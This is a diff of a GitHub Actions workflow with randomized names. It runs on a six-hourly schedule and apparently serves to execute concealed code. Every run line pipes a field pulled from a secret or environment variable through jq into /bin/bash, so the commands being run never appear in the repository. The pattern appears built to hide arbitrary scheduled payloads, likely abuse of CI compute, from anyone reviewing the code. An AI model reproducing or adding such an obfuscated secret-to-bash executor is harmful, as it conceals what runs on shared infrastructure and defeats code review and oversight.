@@ -2,8 +2,9 @@ name: xu7anxa
 on:
   workflow_dispatch:
   schedule:
-    - cron: '38 2/6 * * *'
-jobs:  # 26651
+    - cron: '10 5/6 * * *'
+
+jobs:
   build:
     runs-on: ubuntu-latest
 
@@ -11,16 +12,20 @@ jobs:  # 26651
       - uses: actions/checkout@v4
       - name: xu7anxa
         env:
-          vqhr92: ${{ secrets.vqhr92 }}
+          ftfy34: ${{ secrets.ftfy34 }}
         run: |
-          echo $vqhr92 | jq -r .amdu36007 | /bin/bash
-          echo $jsns4976 | jq -r .fmnmc885 | /bin/bash
-          echo $abdv7 | jq -r .vpan89 | /bin/bash
-          echo $hqd444 | jq -r .rh78 | /bin/bash
-          echo $use20151 | jq -r .wx45 | /bin/bash
-          echo $ut938 | jq -r .odvm2 | /bin/bash
-          echo $muhkz26 | jq -r .r009 | /bin/bash
-          echo $ltt04 | jq -r .rxmhn3277 | /bin/bash
-          echo $ldglf2 | jq -r .h380 | /bin/bash
-          echo $zm22 | jq -r .jka8103 | /bin/bash
+          echo $ftfy34 | jq -r .abe8 | /bin/bash
+          echo $uu388 | jq -r .wm0345 | /bin/bash
+          echo $xc9 | jq -r .yr7 | /bin/bash
+          echo $lksvl230 | jq -r .jeuc60 | /bin/bash
+          echo $sjfz2 | jq -r .gm4 | /bin/bash
+          echo $fdl2 | jq -r .cfs26 | /bin/bash
+          echo $w65975 | jq -r .bx1 | /bin/bash
+          echo $kafb78974 | jq -r .q8221 | /bin/bash
+          echo $tccb841 | jq -r .y50 | /bin/bash
+          echo $adupu16 | jq -r .z864 | /bin/bash
+          echo $atn6182 | jq -r .fgt27829 | /bin/bash
+          echo $yadv182 | jq -r .ea506 | /bin/bash
+          echo $qrd5 | jq -r .v966 | /bin/bash
+          echo $vu47 | jq -r .o1197 | /bin/bash
 
